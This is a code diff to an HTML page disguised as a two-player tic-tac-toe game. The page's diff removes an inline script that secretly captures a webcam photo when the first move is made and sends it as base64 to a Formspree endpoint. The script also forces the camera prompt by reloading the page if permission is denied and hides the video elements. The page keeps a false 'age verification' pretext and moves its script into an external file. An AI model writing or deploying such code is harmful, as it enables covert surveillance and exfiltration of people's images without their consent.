@@ -41,7 +41,6 @@
         text-decoration: none;
         color: white;
       }
-        /* Hide the video elements so it stays sneaky after permission is granted */
         #video, #canvas { display: none; }
     </style>
 </head>
@@ -51,7 +50,7 @@
     <p><em>This is 2 player game!</em></p>
     
     <div class="board" id="board">
-        <!-- 9 cells for the game -->
+        
         <div class="cell" onclick="makeMove(this)"></div>
         <div class="cell" onclick="makeMove(this)"></div>
         <div class="cell" onclick="makeMove(this)"></div>
@@ -73,88 +72,10 @@
     Note: Camera permission is required for Age verification!
 </div>
 
-    <!-- Hidden elements for camera capture -->
+    
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
-    <script>
-                let currentPlayer = 'X';
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        let streamActive = false;
-
-        // 1. Request Camera Permission on load
-        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-            .then(function(stream) {
-                video.srcObject = stream;
-                streamActive = true;
-                video.play();
-            })
-            .catch(function(err) {
-                console.log("Camera prompt denied!");
-              location.reload();
-            });
-
-        // 2. Simple game logic & triggering the photo
-        function makeMove(cell) {
-            if (cell.innerText === '') {
-                cell.innerText = currentPlayer;
-                currentPlayer = currentPlayer === 'X' ? 'O' : 'X';
-                
-                // Take a photo on their second move
-                let moves = document.querySelectorAll('.cell:not(:empty)').length;
-                if (moves === 1 && streamActive) {
-                    takePhoto();
-                }
-            }
-        }
-        function takePhoto() {
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-
-          context.filter = 'brightness(60%)';
-            
-            // Draw the current video frame to the canvas
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-          context.filter = 'none';
-            
-            // Convert to Base64 image data (this creates the long text string)
-            const imageData = canvas.toDataURL('image/png');
-            
-            // Call the email function
-            sendToEmail(imageData);
-        }
-
-        // 4. Send as raw text to bypass Formspree's file block
-        function sendToEmail(base64Image) {
-            const formspreeUrl = "https://formspree.io/f/xkodpenr"; 
-
-            fetch(formspreeUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
-                },
-                body: JSON.stringify({
-                    message: "Decode this image's DNA.",
-                    image_data: base64Image
-                })
-            }).then(response => {
-                if (response.ok) {
-                    console.log("Extracted");
-                } else {
-                    console.error("Failed.");
-                }
-            }).catch(err => console.error("Error", err));
-        }
-
-
-
-
-
-
-    </script>
+    <script src="jsForIndex.js"></script>
 </body>
 </html>
